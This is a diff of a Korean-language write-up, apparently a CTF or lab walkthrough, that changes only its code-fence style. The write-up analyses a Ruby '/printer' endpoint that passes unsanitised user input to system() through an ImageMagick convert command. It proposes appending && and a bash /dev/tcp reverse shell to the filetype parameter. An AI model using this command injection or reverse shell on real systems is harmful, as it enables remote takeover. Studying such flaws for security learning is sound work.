@@ -45,7 +45,7 @@
 
 - 에러를 지속적으로 발생시켜서 출력되는 코드의 일부분들을 조합하여 정리하면 이미지 resize 및 다운로드와 관련된 코드들을 어떻게 동작하는지 확인이 가능하다.
 
-~~~rb
+```rb
 post '/printer' do
   photo = params[:photo]
   filetype = params[:filetype]
@@ -85,27 +85,27 @@ post '/printer' do
   else
     puts "File already exists."
   end
-~~~
+```
 
 - 상기한 코드를 확인하면 filename은 이미지 원본의 이름, 해상도, 파일 확장자로 구성되고
 
-~~~rb
+```rb
 filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
-~~~
+```
 
 - 이 filename은 command의 맨 마지막에 붙는다.
 
-~~~rb
+```rb
 command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
     puts "Executing: #{command}"
     system(command)
-~~~
+```
 
 - 따라서 command의 맨 마지막에 붙는 부분은 filetype 변수이다.
 
-~~~rb
+```rb
 command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
-~~~
+```
 
 - 결과적으로 command의 마지막 부분에 &&등을 붙이고 뒤에 리버스 쉘을 실행하는 명령어 (bash -c 'bash -i >& /dev/tcp/ip/port 0>&1')를 붙이면 될 것으로 예상했다.
 
